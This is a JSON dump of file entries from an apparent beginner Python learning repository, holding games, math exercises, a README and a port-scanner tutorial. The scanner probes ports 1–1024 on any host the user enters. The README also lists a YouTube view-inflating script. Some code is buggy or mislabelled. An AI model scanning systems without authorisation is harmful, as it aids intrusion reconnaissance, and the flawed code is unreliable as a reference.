          "name": "PONG_GAME.py",
          "type": "blob",
          "size": 3.923828125,
          "content": "# Pong Game in Codeskulptor\n\nimport random\n\nimport simplegui\n\nWIDTH = 600\nHEIGHT = 400\nBALL_RADIUS = 20\nPAD_WIDTH = 8\nPAD_HEIGHT = 80\nHALF_PAD_WIDTH = PAD_WIDTH / 2\nHALF_PAD_HEIGHT = PAD_HEIGHT / 2\nLEFT = False\nRIGHT = True\nscore1 = 0\nscore2 = 0\npaddle1_pos = 0\npaddle2_pos = 0\npaddle1_vel = 0\npaddle2_vel = 0\n\n\ndef spawn_ball(direction):\n    global ball_pos, ball_vel  # these are vectors stored as lists\n    ball_pos = [WIDTH / 2, HEIGHT / 2]\n    if direction == RIGHT:\n        ball_vel = [random.randrange(120, 240) / 60, random.randrange(60, 180) / 60]\n    elif direction == LEFT:\n        ball_vel = [-random.randrange(120, 240) / 60, random.randrange(60, 180) / 60]\n\n\ndef reset():\n    global ball_pos, score1, score2\n    ball_pos = [WIDTH / 2, HEIGHT / 2]\n    score1 = 0\n    score2 = 0\n\n\ndef new_game():\n    global paddle1_pos, paddle2_pos, paddle1_vel, paddle2_vel\n    global score1, score2\n    reset()\n    spawn_ball(RIGHT)\n\n\ndef draw(canvas):\n    global paddle1_pos, paddle2_pos, ball_pos, ball_vel, paddle1_vel, paddle2_vel, BALL_RADIUS\n    global score1, score2\n\n    canvas.draw_line([WIDTH / 2, 0], [WIDTH / 2, HEIGHT], 1, \"White\")\n    canvas.draw_line([PAD_WIDTH, 0], [PAD_WIDTH, HEIGHT], 1, \"White\")\n    canvas.draw_line([WIDTH - PAD_WIDTH, 0], [WIDTH - PAD_WIDTH, HEIGHT], 1, \"White\")\n\n    ball_pos[0] += ball_vel[0]\n    ball_pos[1] += ball_vel[1]\n\n    if (\n        ball_pos[0] <= BALL_RADIUS + PAD_WIDTH\n        or ball_pos[0] >= WIDTH - BALL_RADIUS - PAD_WIDTH\n    ):\n        ball_vel[0] = -ball_vel[0]\n    elif (\n        ball_pos[1] <= BALL_RADIUS + PAD_WIDTH\n        or ball_pos[1] >= HEIGHT - BALL_RADIUS - PAD_WIDTH\n    ):\n        ball_vel[1] = -ball_vel[1]\n\n    canvas.draw_circle(ball_pos, BALL_RADIUS, 1, \"White\", \"White\")\n\n    paddle1_pos += paddle1_vel\n    paddle2_pos += paddle2_vel\n\n    if paddle1_pos <= -HEIGHT / 2 + PAD_HEIGHT / 2:\n        paddle1_pos = -HEIGHT / 2 + PAD_HEIGHT / 2\n    elif paddle1_pos >= HEIGHT / 2 - PAD_HEIGHT / 2:\n        paddle1_pos = HEIGHT / 2 - PAD_HEIGHT / 2\n\n    if paddle2_pos <= -HEIGHT / 2 + PAD_HEIGHT / 2:\n        paddle2_pos = -HEIGHT / 2 + PAD_HEIGHT / 2\n    elif paddle2_pos >= HEIGHT / 2 - PAD_HEIGHT / 2:\n        paddle2_pos = HEIGHT / 2 - PAD_HEIGHT / 2\n\n    canvas.draw_line(\n        [PAD_WIDTH / 2, paddle1_pos + HEIGHT / 2 - PAD_HEIGHT / 2],\n        [PAD_WIDTH / 2, paddle1_pos + PAD_HEIGHT / 2 + HEIGHT / 2],\n        10,\n        \"White\",\n    )\n    canvas.draw_line(\n        [WIDTH - PAD_WIDTH / 2, paddle2_pos + HEIGHT / 2 - PAD_HEIGHT / 2],\n        [WIDTH - PAD_WIDTH / 2, PAD_HEIGHT / 2 + paddle2_pos + HEIGHT / 2],\n        10,\n        \"White\",\n    )\n\n    if (\n        ball_pos[1] <= (paddle1_pos + HEIGHT / 2 - PAD_HEIGHT / 2)\n        or ball_pos[1] >= (paddle1_pos + PAD_HEIGHT / 2 + HEIGHT / 2)\n    ) and ball_pos[0] == (PAD_WIDTH + BALL_RADIUS):\n        score2 += 1\n    else:\n        pass\n\n    if (\n        ball_pos[1] <= (paddle2_pos + HEIGHT / 2 - PAD_HEIGHT / 2)\n        or ball_pos[1] >= (paddle2_pos + PAD_HEIGHT / 2 + HEIGHT / 2)\n    ) and ball_pos[0] == (WIDTH - PAD_WIDTH - BALL_RADIUS):\n        score1 += 1\n    else:\n        pass\n\n    canvas.draw_text(str(score1), (250, 30), 40, \"White\")\n    canvas.draw_text(str(score2), (330, 30), 40, \"White\")\n\n\ndef keydown(key):\n    global paddle1_vel, paddle2_vel\n    if key == simplegui.KEY_MAP[\"down\"]:\n        paddle1_vel = 2\n    elif key == simplegui.KEY_MAP[\"up\"]:\n        paddle1_vel = -2\n\n    if key == simplegui.KEY_MAP[\"w\"]:\n        paddle2_vel = -2\n    elif key == simplegui.KEY_MAP[\"s\"]:\n        paddle2_vel = 2\n\n\ndef keyup(key):\n    global paddle1_vel, paddle2_vel\n    if key == simplegui.KEY_MAP[\"down\"] or key == simplegui.KEY_MAP[\"up\"]:\n        paddle1_vel = 0\n    if key == simplegui.KEY_MAP[\"w\"] or key == simplegui.KEY_MAP[\"s\"]:\n        paddle2_vel = 0\n\n\nframe = simplegui.create_frame(\"Pong\", WIDTH, HEIGHT)\nframe.set_draw_handler(draw)\nframe.set_keydown_handler(keydown)\nframe.set_keyup_handler(keyup)\nframe.add_button(\"Restart\", reset)\n\nnew_game()\nprint()\nframe.start()\n"
        },
        {
          "name": "PORT SCANNER.PY",
          "type": "blob",
          "size": 3.447265625,
          "content": "#!/usr/bin/env python\n\"\"\"\nPORT SCANNER IN PYTHON...\nThis post will show how you can make a small and easy-to-use port scanner program\nwritten in Python.\nThere are many ways of doing this with Python, and I'm going to do it using the\nbuilt-in module Socket.\nSockets\nThe socket module in Python provides access to the BSD socket interface.\n\nIt includes the socket class, for handling the actual data channel, and functions\nfor network-related tasks such as converting a server’s name to an address and\nformatting data to be sent across the network. Source\n\nSockets are widely used on the Internet, as they are behind any kind of\nnetwork communications done by your computer.\n\nThe INET sockets, account for at least 99% of the sockets in use.\n\nThe web browser’s that you use opens a socket and connects to the web server.\n\nAny network communication goes through a socket.\n\nFor more reading about the socket module, please see the official documentation\nSocket functions\nBefore we get started with our sample program, let's see some of the socket\nfunctions we are going to use.\n\nsock = socket.socket (socket_family, socket_type)\nSyntax for creating a socket\n\nsock = socket.socket (socket.AF_INET, socket.SOCK_STREAM)\nCreates a stream socket\n\nAF_INET\nSocket Family (here Address Family version 4 or IPv4)\n\nSOCK_STREAM\nSocket type TCP connections\n\nSOCK_DGRAM\nSocket type UDP connections\n\ngethostbyname(\"host\")\nTranslate a host name to IPv4 address format\n\nsocket.gethostbyname_ex(\"host\")\nTranslate a host name to IPv4 address format, extended interface\n\nsocket.getfqdn(\"8.8.8.8\")\nGet the fqdn (fully qualified domain name)\n\nsocket.gethostname()\nReturns the hostname of the machine..\n\nsocket.error\nException handling\nMaking a program using Python Sockets\nHow to make a simple port scanner program in Python\n\nThis small port scanner program will try to connect on every port you define for\na particular host.\n\nThe first thing we must do is import the socket library and other libraries that\nwe need.\n\nOpen up an text editor, copy & paste the code below. Save the file as:\n\"portscanner.py\" and exit the editor\n\"\"\"\n\nimport socket\nimport subprocess\nimport sys\nfrom time import time\nimport platform\n\n# Clear the screen\nsubprocess.call('clear' if platform.platform() in (\"Linux\", \"Darwin\") else \"cls\", shell=True)\n\n# Ask for input\nremoteServer = input(\"Enter a remote host to scan: \")\nremoteServerIP = socket.gethostbyname(remoteServer)\n\n# Print a nice banner with information on which host we are about to scan\nprint(\"-\" * 60)\nprint(\"Please wait, scanning remote host\", remoteServerIP)\nprint(\"-\" * 60)\n\n# Check what time the scan started\nt1 = time()\n\n# Using the range function to specify ports (here it will scans all ports between 1 and 1024)\n\n# We also put in some error handling for catching errors\n\ntry:\n    for port in range(1, 1025):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        result = sock.connect_ex((remoteServerIP, port))\n        if result == 0:\n            print(\"Port {}: \t Open\".format(port))\n        sock.close()\n\nexcept KeyboardInterrupt:\n    print(\"You pressed Ctrl+C\")\n    sys.exit(2)\n\nexcept socket.gaierror:\n    print('Hostname could not be resolved. Exiting')\n    sys.exit(1)\n\nexcept socket.error:\n    print(\"Couldn't connect to server\")\n    sys.exit(3)\n\n# Checking the time again\nt2 = time()\n\n# Calculates the difference of time, to see how long it took to run the script\ntotal = t2 - t1\n\n# Printing the information to screen\nprint('Scanning Completed in about {total} seconds', total)\n"
        },
        {
          "name": "PRACTICEPROJECT-DISREGARD.txt",
          "type": "blob",
          "size": 0.1162109375,
          "content": "This is practice for my first time using GitHub\n\nPlease disregard as I'm getting used to using CLI and GitHub\n\nThanks!\n"
        },
        {
          "name": "Palindrome_Checker.py",
          "type": "blob",
          "size": 0.4013671875,
          "content": "\"\"\"\n\nA simple method is , to reverse the string and and compare with original string.\nIf both are same that's means string is palindrome otherwise else. \n\"\"\"\nphrase = input()\nif phrase == phrase[::-1]:  # slicing technique\n    \"\"\"phrase[::-1] this code is for reverse a string very smartly\"\"\"\n\n    print(\"\\n Wow!, The phrase is a Palindrome!\")\nelse:\n    print(\"\\n Sorry, The given phrase is not a Palindrome.\")\n"
        },
        {
          "name": "Password Generator",
          "type": "tree",
          "content": null
        },
        {
          "name": "Patterns",
          "type": "tree",
          "content": null
        },
        {
          "name": "PingPong",
          "type": "tree",
          "content": null
        },
        {
          "name": "Polyline.py",
          "type": "blob",
          "size": 0.541015625,
          "content": "# Polyline drawing in codeskulptor\n\nimport simplegui\n\npolyline = []\n\n\ndef click(pos):\n    global polyline\n    polyline.append(pos)\n\n\ndef clear():\n    global polyline\n    polyline = []\n\n\ndef draw(canvas):\n    if len(polyline) == 1:\n        canvas.draw_point(polyline[0], \"White\")\n    for i in range(1, len(polyline)):\n        canvas.draw_line(polyline[i - 1], polyline[i], 2, \"White\")\n\n\nframe = simplegui.create_frame(\"Echo click\", 300, 200)\nframe.set_mouseclick_handler(click)\nframe.set_draw_handler(draw)\nframe.add_button(\"Clear\", clear)\n\nframe.start()\n"
        },
        {
          "name": "PongPong_Game",
          "type": "tree",
          "content": null
        },
        {
          "name": "Prime_number.py",
          "type": "blob",
          "size": 0.9306640625,
          "content": "# Author:       Tan Duc Mai\n# Email:        tan.duc.work@gmail.com\n# Description:  Three different functions to check whether a given number is a prime.\n#               Return True if it is a prime, False otherwise.\n#               Those three functions, from a to c, decreases in efficiency\n#               (takes longer time).\n\nfrom math import sqrt\n\n\ndef is_prime_a(n):\n    if n < 2:\n        return False\n    sqrt_n = int(sqrt(n))\n    for i in range(2, sqrt_n + 1):\n        if n % i == 0:\n            return False\n    return True\n\n\ndef is_prime_b(n):\n    if n > 1:\n        if n == 2:\n            return True\n        else:\n            for i in range(2, int(n//2)+1):\n                if n % i == 0:\n                    return False\n            return True\n    return False\n\n\ndef is_prime_c(n):\n    divisible = 0\n    for i in range(1, n + 1):\n        if n % i == 0:\n            divisible += 1\n    if divisible == 2:\n        return True\n    return False\n"
        },
        {
          "name": "Program of Reverse of any number.py",
          "type": "blob",
          "size": 0.25390625,
          "content": "num = int(input(\"enter any Number\"))\nrev = 0\nwhile num > 0:\n    Rem = num % 10\n    num = num // 10\n    rev = rev * 10 + Rem\nprint(\"The Reverse of the number\", rev)\n##################\n# could also simply do this another way\n\nnum = input()\nprint(int(num[::-1]))\n"
        },
        {
          "name": "Program to print table of given number.py",
          "type": "blob",
          "size": 0.2568359375,
          "content": "n = int(input(\"Enter the number to print the tables for:\"))\nfor i in range(1, 11):\n    print(n, \"x\", i, \"=\", n * i)\n\n# Example\n# input: 2\n# output:\n\"\"\"\n2 x 1 = 2\n2 x 2 = 4\n2 x 3 = 6\n2 x 4 = 8\n2 x 5 = 10\n2 x 6 = 12\n2 x 7 = 14\n2 x 8 = 16\n2 x 9 = 18\n2 x 10 = 20\n\"\"\"\n"
        },
        {
          "name": "Program to reverse Linked List( Recursive solution).py",
          "type": "blob",
          "size": 1.1806640625,
          "content": "from sys import stdin, setrecursionlimit\n\nsetrecursionlimit(10 ** 6)\n\n# Following is the Node class already written for the Linked List\nclass Node:\n    def __init__(self, data):\n        self.data = data\n        self.next = None\n\n\ndef reverseLinkedListRec(head):\n    if head is None:\n        return None\n    if head.next is None:\n        return head\n    smallhead = reverseLinkedListRec(head.next)\n    head.next.next = head\n    head.next = None\n    return smallhead\n\n\n# Taking Input Using Fast I/O\ndef takeInput():\n    head = None\n    tail = None\n\n    datas = list(map(int, stdin.readline().rstrip().split(\" \")))\n\n    i = 0\n    while (i < len(datas)) and (datas[i] != -1):\n        data = datas[i]\n        newNode = Node(data)\n\n        if head is None:\n            head = newNode\n            tail = newNode\n\n        else:\n            tail.next = newNode\n            tail = newNode\n\n        i += 1\n\n    return head\n\n\ndef printLinkedList(head):\n    while head is not None:\n        print(head.data, end=\" \")\n        head = head.next\n        print()\n\n\n# main\nt = int(stdin.readline().rstrip())\n\nwhile t > 0:\n\n    head = takeInput()\n\n    newHead = reverseLinkedListRec(head)\n    printLinkedList(newHead)\n\n    t -= 1\n"
        },
        {
          "name": "Python Distance.py",
          "type": "blob",
          "size": 0.33203125,
          "content": "# Display the powers of 2 using anonymous function\n\nterms = 10\n\n# Uncomment code below to take input from the user\n# terms = int(input(\"How many terms? \"))\n\n# use anonymous function\nresult = list(map(lambda x: 2 ** x, range(terms)))\n\nprint(\"The total terms are:\",terms)\nfor i in range(terms):\n   print(\"2 raised to power\",i,\"is\",result[i])\n"
        },
        {
          "name": "Python Program for Product of unique prime factors of a number.py",
          "type": "blob",
          "size": 0.458984375,
          "content": "# Python program to find sum of given \n# series. \n\ndef productPrimeFactors(n): \n\tproduct = 1\n\t\n\tfor i in range(2, n+1): \n\t\tif (n % i == 0): \n\t\t\tisPrime = 1\n\t\t\t\n\t\t\tfor j in range(2, int(i/2 + 1)): \n\t\t\t\tif (i % j == 0): \n\t\t\t\t\tisPrime = 0\n\t\t\t\t\tbreak\n\t\t\t\t\n\t\t\t# condition if \\'i\\' is Prime number \n\t\t\t# as well as factor of num \n\t\t\tif (isPrime): \n\t\t\t\tproduct = product * i \n\t\t\t\t\n\treturn product \n\t\n\t\n\t\n# main() \nn = 44\nprint (productPrimeFactors(n)) \n\n# Contributed by _omg \n"
        },
        {
          "name": "Python Program for Tower of Hanoi.py",
          "type": "blob",
          "size": 0.4130859375,
          "content": "# Recursive Python function to solve the tower of hanoi \ndef TowerOfHanoi(n , source, destination, auxiliary): \n\tif n==1: \n\t\tprint(\"Move disk 1 from source \",source,\" to destination \",destination) \n\t\treturn\n\tTowerOfHanoi(n-1, source, auxiliary, destination) \n\tprint(\"Move disk \",n,\" from source \",source,\" to destination \",destination)\n\tTowerOfHanoi(n-1, auxiliary, destination, source)  \nn = 4\nTowerOfHanoi(n,'A','B','C')\n"
        },
        {
          "name": "Python Program for factorial of a number",
          "type": "blob",
          "size": 0.7744140625,
          "content": "\"\"\"\nFactorial of a non-negative integer, is multiplication of\nall integers smaller than or equal to n. \nFor example factorial of 6 is 6*5*4*3*2*1 which is 720.\n\"\"\"\n\n\"\"\"\nRecursive:\nPython3 program to find factorial of given number \n\"\"\"\ndef factorial(n): \n      \n    # single line to find factorial \n    return 1 if (n==1 or n==0) else n * factorial(n - 1);  \n  \n# Driver Code \nnum = 5; \nprint(\"Factorial of\",num,\"is\", factorial((num)))\n\n\"\"\"\nIterative:\nPython 3 program to find factorial of given number.\n\"\"\" \ndef factorial(n): \n    if n < 0: \n        return 0\n    elif n == 0 or n == 1: \n        return 1\n    else: \n        fact = 1\n        while(n > 1): \n            fact *= n \n            n -= 1\n        return fact \n  \n# Driver Code \nnum = 5; \nprint(\"Factorial of\",num,\"is\", factorial(num))\n"
        },
        {
          "name": "Python Program to Count the Number of Each Vowel.py",
          "type": "blob",
          "size": 0.3896484375,
          "content": "# Program to count the number of each vowels\n\n# string of vowels\nvowels = 'aeiou'\n\nip_str = 'Hello, have you tried our tutorial section yet?'\n\n# make it suitable for caseless comparisions\nip_str = ip_str.casefold()\n\n# make a dictionary with each vowel a key and value 0\ncount = {}.fromkeys(vowels,0)\n\n# count the vowels\nfor char in ip_str:\n   if char in count:\n       count[char] += 1\n\nprint(count)\n"
        },
        {
          "name": "Python Program to Display Fibonacci Sequence Using Recursion.py",
          "type": "blob",
          "size": 0.306640625,
          "content": "def recur_fibo(n):\n   if n <= 1:\n       return n\n   else:\n       return(recur_fibo(n-1) + recur_fibo(n-2))\n\nnterms = 10\n\n# check if the number of terms is valid\nif nterms <= 0:\n   print(\"Please enter a positive integer\")\nelse:\n   print(\"Fibonacci sequence:\")\n   for i in range(nterms):\n       print(recur_fibo(i))\n"
        },
        {
          "name": "Python Program to Find LCM.py",
          "type": "blob",
          "size": 0.380859375,
          "content": "# Python Program to find the L.C.M. of two input number\n\ndef compute_lcm(x, y):\n\n   # choose the greater number\n   if x > y:\n       greater = x\n   else:\n       greater = y\n\n   while(True):\n       if((greater % x == 0) and (greater % y == 0)):\n           lcm = greater\n           break\n       greater += 1\n\n   return lcm\n\nnum1 = 54\nnum2 = 24\n\nprint(\"The L.C.M. is\", compute_lcm(num1, num2))\n"
        },
        {
          "name": "Python Program to Merge Mails.py",
          "type": "blob",
          "size": 0.6357421875,
          "content": "# Python program to mail merger\n# Names are in the file names.txt\n# Body of the mail is in body.txt\n\n# open names.txt for reading\nwith open(\"names.txt\", 'r', encoding='utf-8') as names_file:\n\n    # open body.txt for reading\n    with open(\"body.txt\", 'r', encoding='utf-8') as body_file:\n\n        # read entire content of the body\n        body = body_file.read()\n\n        # iterate over names\n        for name in names_file:\n            mail = \"Hello \" + name.strip() + \"\\n\" + body\n\n            # write the mails to individual files\n            with open(name.strip()+\".txt\", 'w', encoding='utf-8') as mail_file:\n                mail_file.write(mail)\n\n"
        },
        {
          "name": "Python Program to Print the Fibonacci sequence.py",
          "type": "blob",
          "size": 0.484375,
          "content": "# Program to display the Fibonacci sequence up to n-th term\n\nnterms = int(input(\"How many terms? \"))\n\n# first two terms\nn1, n2 = 0, 1\ncount = 0\n\n# check if the number of terms is valid\nif nterms <= 0:\n   print(\"Please enter a positive integer\")\nelif nterms == 1:\n   print(\"Fibonacci sequence upto\",nterms,\":\")\n   print(n1)\nelse:\n   print(\"Fibonacci sequence:\")\n   while count < nterms:\n       print(n1)\n       nth = n1 + n2\n       # update values\n       n1 = n2\n       n2 = nth\n       count += 1\n"
        },
        {
          "name": "Python Program to Remove Punctuations from a String.py",
          "type": "blob",
          "size": 0.3623046875,
          "content": "# define punctuation\npunctuations = '''!()-[]{};:'\"\\,<>./?@#$%^&*_~'''\n\nmy_str = \"Hello!!!, he said ---and went.\"\n\n# To take input from the user\n# my_str = input(\"Enter a string: \")\n\n# remove punctuation from the string\nno_punct = \"\"\nfor char in my_str:\n   if char not in punctuations:\n       no_punct = no_punct + char\n\n# display the unpunctuated string\nprint(no_punct)\n"
        },
        {
          "name": "Python Program to Reverse a linked list.py",
          "type": "blob",
          "size": 1.1630859375,
          "content": "# Python program to reverse a linked list \n# Time Complexity : O(n) \n# Space Complexity : O(1) \n\n# Node class \nclass Node: \n\n\t# Constructor to initialize the node object \n\tdef __init__(self, data): \n\t\tself.data = data \n\t\tself.next = None\n\nclass LinkedList: \n\n\t# Function to initialize head \n\tdef __init__(self): \n\t\tself.head = None\n\n\t# Function to reverse the linked list \n\tdef reverse(self): \n\t\tprev = None\n\t\tcurrent = self.head \n\t\twhile(current is not None): \n\t\t\tnext = current.next\n\t\t\tcurrent.next = prev \n\t\t\tprev = current \n\t\t\tcurrent = next\n\t\tself.head = prev \n\t\t\n\t# Function to insert a new node at the beginning \n\tdef push(self, new_data): \n\t\tnew_node = Node(new_data) \n\t\tnew_node.next = self.head \n\t\tself.head = new_node \n\n\t# Utility function to print the linked LinkedList \n\tdef printList(self): \n\t\ttemp = self.head \n\t\twhile(temp): \n\t\t\tprint(temp.data)\n\t\t\ttemp = temp.next\n\n\n# Driver program to test above functions \nllist = LinkedList() \nllist.push(20) \nllist.push(4) \nllist.push(15) \nllist.push(85) \n\nprint(\"Given Linked List\")\nllist.printList() \nllist.reverse() \nprint(\"\\nReversed Linked List\")\nllist.printList() \n\n# This code is contributed by Nikhil Kumar Singh(nickzuck_007) \n"
        },
        {
          "name": "Python Program to Sort Words in Alphabetic Order.py",
          "type": "blob",
          "size": 1.18359375,
          "content": "# Program to sort words alphabetically and put them in a dictionary with corresponding numbered keys\n# We are also removing punctuation to ensure the desired output, without importing a library for assistance. \n\n# Declare base variables\nword_Dict = {}\ncount = 0\nmy_str = \"Hello this Is an Example With cased letters. Hello, this is a good string\"\n#Initialize punctuation\npunctuations = '''!()-[]{};:'\",<>./?@#$%^&*_~'''\n\n# To take input from the user\n#my_str = input(\"Enter a string: \")\n\n# remove punctuation from the string and use an empty variable to put the alphabetic characters into\nno_punct = \"\"\nfor char in my_str:\n   if char not in punctuations:\n       no_punct = no_punct + char\n\n# Make all words in string lowercase. my_str now equals the original string without the punctuation \nmy_str = no_punct.lower()\n\n# breakdown the string into a list of words\nwords = my_str.split()\n\n# sort the list and remove duplicate words\nwords.sort()\n\nnew_Word_List = []\nfor word in words:\n    if word not in new_Word_List:\n        new_Word_List.append(word)\n    else:\n        continue\n\n# insert sorted words into dictionary with key\n\nfor word in new_Word_List:\n    count+=1\n    word_Dict[count] = word\n\nprint(word_Dict)\n"
        },
        {
          "name": "Python Program to Transpose a Matrix.py",
          "type": "blob",
          "size": 0.236328125,
          "content": "X = [[12,7],\n    [4 ,5],\n    [3 ,8]]\n\nresult = [[0,0,0],\n         [0,0,0]]\n\n# iterate through rows\nfor i in range(len(X)):\n   # iterate through columns\n   for j in range(len(X[0])):\n       result[j][i] = X[i][j]\n\nfor r in result:\n   print(r)\n"
        },
        {
          "name": "Python-Array-Equilibrium-Index.py",
          "type": "blob",
          "size": 1.138671875,
          "content": "\"\"\"Array Equilibrium Index\nSend Feedback\nFind and return the equilibrium index of an array. Equilibrium index of an array is an index i such that the sum of elements at indices less than i is equal to the sum of elements at indices greater than i.\nElement at index i is not included in either part.\nIf more than one equilibrium index is present, you need to return the first one. And return -1 if no equilibrium index is present.\nInput format :\nLine 1 : Size of input array\nLine 2 : Array elements (separated by space)\nConstraints:\nTime Limit: 1 second\nSize of input array lies in the range: [1, 1000000]\nSample Input :\n7\n-7 1 5 2 -4 3 0\nSample Output :\n3 \"\"\"\ndef equilibrium(arr): \n  \n    # finding the sum of whole array \n    total_sum = sum(arr) \n    leftsum = 0\n    for i, num in enumerate(arr): \n          \n        # total_sum is now right sum \n        # for index i \n        total_sum -= num \n          \n        if leftsum == total_sum: \n            return i \n        leftsum += num \n       \n      # If no equilibrium index found,  \n      # then return -1 \n    return -1\nn = int(input())\narr = [int(i) for i in input().strip().split()]\nprint(equilibrium(arr))\n"
        },
        {
          "name": "Python_chatting_application",
          "type": "tree",
          "content": null
        },
        {
          "name": "Python_swapping.py",
          "type": "blob",
          "size": 0.345703125,
          "content": "# Python3 program to swap first \n# and last element of a list \n  \n# Swap function \ndef swapList(newList): \n    size = len(newList) \n      \n    # Swapping  \n    temp = newList[0] \n    newList[0] = newList[size - 1] \n    newList[size - 1] = temp \n      \n    return newList \n      \n# Driver code \nnewList = [12, 35, 9, 56, 24] \n  \nprint(swapList(newList)) \n"
        },
        {
          "name": "QR_code_generator",
          "type": "tree",
          "content": null
        },
        {
          "name": "QuadraticCalc.py",
          "type": "blob",
          "size": 1.2421875,
          "content": "# GGearing\r\n# 02/10/2017\r\n# Simple script to calculate the quadratic formula of a sequence of numbers and\r\n# recognises when the sequence isn't quadratic\r\n\r\n\r\ndef findLinear(numbers):  # find a & b of linear sequence\r\n    a = numbers[1] - numbers[0]\r\n    a1 = numbers[2] - numbers[1]\r\n    if a1 == a:\r\n        b = numbers[0] - a\r\n        return (a, b)\r\n    else:\r\n        print(\"Sequence is not linear\")\r\n\r\n\r\nsequence = []\r\nfirst_difference = []\r\nsecond_difference = []\r\nfor i in range(4):  # input\r\n    term = str(i + 1)\r\n    inp = int(input(\"Enter term \" + term + \": \"))\r\n    sequence.append(inp)\r\n\r\nfor i in range(3):\r\n    gradient = sequence[i + 1] - sequence[i]\r\n    first_difference.append(gradient)\r\nfor i in range(2):\r\n    gradient = first_difference[i + 1] - first_difference[i]\r\n    second_difference.append(gradient)\r\n\r\nif second_difference[0] == second_difference[1]:  # checks to see if consistent\r\n    a = second_difference[0] / 2\r\n    subs_diff = []\r\n    for i in range(4):\r\n        n = i + 1\r\n        num = a * (n * n)\r\n        subs_diff.append((sequence[i]) - num)\r\n    b, c = findLinear(subs_diff)\r\n    print(\r\n        \"Nth term: \" + str(a) + \"n^2 + \" + str(b) + \"n + \" + str(c)\r\n    )  # outputs nth term\r\nelse:\r\n    print(\"Sequence is not quadratic\")\r\n"
        },
        {
          "name": "QuestionAnswerVirtualAssistant",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 7.6513671875,
          "content": "# My Python Eggs 🐍 😄\n\n<hr>\n\nI do not consider myself as a programmer. I create these little programs as experiments to play with Python, or to solve problems for myself. I would gladly accept pointers from others to improve, simplify, or make the code more efficient. If you would like to make any comments then please feel free to email me: craig@geekcomputers.co.uk.\n\n<hr>\n\nThis repository contains a collection of Python scripts that are designed to reduce human workload and serve as educational examples for beginners to get started with Python. The code documentation is aligned correctly for viewing in [Notepad++](https://notepad-plus-plus.org/) :spiral_notepad:\n\nFeel free to explore the scripts and use them for your learning and automation needs!\n\n## List of Scripts:\n\n1. [batch_file_rename.py](https://github.com/geekcomputers/Python/blob/master/batch_file_rename.py) - Batch rename a group of files in a specified directory, changing their extensions.\n2. [create_dir_if_not_there.py](https://github.com/geekcomputers/Python/blob/master/create_dir_if_not_there.py) - Check if a directory exists in the user's home directory. Create it if it doesn't exist.\n3. [Fast Youtube Downloader](https://github.com/geekcomputers/Python/blob/master/youtubedownloader.py) - Download YouTube videos quickly with parallel threads using aria2c.\n4. [Google Image Downloader](https://github.com/geekcomputers/Python/tree/master/Google_Image_Downloader) - Query a given term and retrieve images from the Google Image database.\n5. [dir_test.py](https://github.com/geekcomputers/Python/blob/master/dir_test.py) - Test if the directory `testdir` exists. If not, create it.\n6. [env_check.py](https://github.com/geekcomputers/Python/blob/master/env_check.py) - Check if all the required environment variables are set.\n7. [blackjack.py](https://github.com/Ratna04priya/Python/blob/master/BlackJack_game/blackjack.py) - Casino Blackjack-21 game in Python.\n8. [fileinfo.py](https://github.com/geekcomputers/Python/blob/master/fileinfo.py) - Show file information for a given file.\n9. [folder_size.py](https://github.com/geekcomputers/Python/blob/master/folder_size.py) - Scan the current directory and all subdirectories and display their sizes.\n10. [logs.py](https://github.com/geekcomputers/Python/blob/master/logs.py) - Search for all `*.log` files in a directory, zip them using the specified program, and date stamp them.\n11. [move_files_over_x_days.py](https://github.com/geekcomputers/Python/blob/master/move_files_over_x_days.py) - Move all files over a specified age (in days) from the source directory to the destination directory.\n12. [nslookup_check.py](https://github.com/geekcomputers/Python/blob/master/nslookup_check.py) - Open the file `server_list.txt` and perform nslookup for each server to check the DNS entry.\n13. [osinfo.py](https://github.com/geekcomputers/Python/blob/master/osinfo.py) - Display information about the operating system on which the script is running.\n14. [ping_servers.py](https://github.com/geekcomputers/Python/blob/master/ping_servers.py) - Ping the servers associated with the specified application group.\n15. [ping_subnet.py](https://github.com/geekcomputers/Python/blob/master/ping_subnet.py) - Scan the final range of a given IP subnet for available addresses.\n16. [powerdown_startup.py](https://github.com/geekcomputers/Python/blob/master/powerdown_startup.py) - Ping machines in the server list. Load the putty session if the machine is up, or notify if it is not.\n17. [puttylogs.py](https://github.com/geekcomputers/Python/blob/master/puttylogs.py) - Zip all the logs in the given directory.\n18. [script_count.py](https://github.com/geekcomputers/Python/blob/master/script_count.py) - Scan the scripts directory and count the different types of scripts.\n19. [get_youtube_view.py](https://github.com/geekcomputers/Python/blob/master/get_youtube_view.py) - Get more views for YouTube videos and repeat songs on YouTube.\n20. [script_listing.py](https://github.com/geekcomputers/Python/blob/master/script_listing.py) - List all files in a given directory and its subdirectories.\n21. [testlines.py](https://github.com/geekcomputers/Python/blob/master/testlines.py) - Open a file and print out 100 lines of the set line variable.\n22. [tweeter.py](https://github.com/geekcomputers/Python/blob/master/tweeter.py) - Tweet text or a picture from the terminal.\n23. [serial_scanner.py](https://github.com/geekcomputers/Python/blob/master/serial_scanner.py) - List available serial ports in use on Linux and Windows systems.\n24. [get_youtube_view.py](https://github.com/geekcomputers/Python/blob/master/get_youtube_view.py) - Get more views for YouTube videos and repeat songs on YouTube.\n25. [CountMillionCharacter.py](https://github.com/geekcomputers/Python/blob/master/CountMillionCharacter.py) and [CountMillionCharacter2.0](https://github.com/geekcomputers/Python/blob/master/CountMillionCharacters-2.0.py) - Get character count of a text file.\n26. [xkcd_downloader.py](https://github.com/geekcomputers/Python/blob/master/xkcd_downloader.py) - Download the latest XKCD comic and place them in a new folder called \"comics\".\n27. [timymodule.py](https://github.com/geekcomputers/Python/blob/master/timymodule.py) - An alternative to Python's 'timeit' module and easier to use.\n28. [calculator.py](https://github.com/geekcomputers/Python/blob/master/calculator.py) - Implement a calculator using Python's eval() function.\n29. [Google_News.py](https://github.com/geekcomputers/Python/blob/master/Google_News.py) - Use BeautifulSoup to provide latest news headlines along with news links.\n30. [cricket_live_score](https://github.com/geekcomputers/Python/blob/master/Cricket_score.py) - Use BeautifulSoup to provide live cricket scores.\n31. [youtube.py](https://github.com/geekcomputers/Python/blob/master/youtube.py) - Take a song name as input and fetch the YouTube URL of the best matching song and play it.\n32. [site_health.py](https://github.com/geekcomputers/Python/blob/master/site_health.py) - Check the health of a remote server.\n33. [SimpleStopWatch.py](https://github.com/geekcomputers/Python/blob/master/SimpleStopWatch.py) - Simple stop watch implementation using Python's time module.\n34. [Changemac.py](https://github.com/geekcomputers/Python/blob/master/changemac.py) - Change your 